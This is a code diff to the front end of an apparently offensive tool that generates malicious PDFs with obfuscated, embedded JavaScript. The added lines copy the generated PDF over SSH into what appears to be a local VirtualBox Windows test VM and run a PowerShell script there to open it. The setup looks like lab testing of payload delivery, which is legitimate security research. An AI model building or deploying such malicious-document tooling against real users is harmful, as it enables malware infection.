@@ -1,6 +1,11 @@
-from malicious_pdf_generator import obfuscated_code, embedded_javascript_into_pdf, const
+from malicious_pdf_generator import obfuscated_code, embedded_javascript_into_pdf, create_ssh_client, transfer_file, execute_powershell_script, const
+
 import argparse
 import pyfiglet
+import os
+import sys
+import argparse
+from pathlib import Path
 
 
 def cli():
@@ -84,6 +89,44 @@ def main():
     payload = choose_payload()
     generate_malicious_pdf(payload, args.input, args.output)
 
+    # Deployment variables
+    host = 'localhost'
+    port = 2222
+    username = 'vboxuser'
+    key_filepath = '~/.ssh/id_rsa'
+    remote_dir = 'C:/Users/vboxuser/Documents'
+    local_pdf_path = args.output  
+
+    # Expand user tilde (~) in paths
+    key_filepath = os.path.expanduser(key_filepath)
+    local_pdf_path = os.path.expanduser(local_pdf_path)
+
+    # Validate SSH key path
+    key_path = Path(key_filepath)
+    if not key_path.is_file():
+        print(f"[ERROR] The SSH key file {key_filepath} does not exist.")
+        sys.exit(1)
+
+    # Establish SSH connection
+    ssh_client = create_ssh_client(
+        host=host,
+        port=port,
+        username=username,
+        key_filepath=key_filepath
+    )
+
+    # Define remote file path
+    remote_pdf_path = os.path.join(remote_dir, os.path.basename(local_pdf_path))
+
+    # Transfer the PDF
+    transfer_file(ssh_client, local_pdf_path, remote_pdf_path)
+
+    # Execute the PowerShell script on the VM
+    script_path = 'C:\\Users\\vboxuser\\scripts\\Open-Pdf-interactive.ps1'  #
+    execute_powershell_script(ssh_client, script_path, remote_pdf_path)
+
+    # Close SSH connection
+    ssh_client.close()
 
 if __name__ == "__main__":
     main()
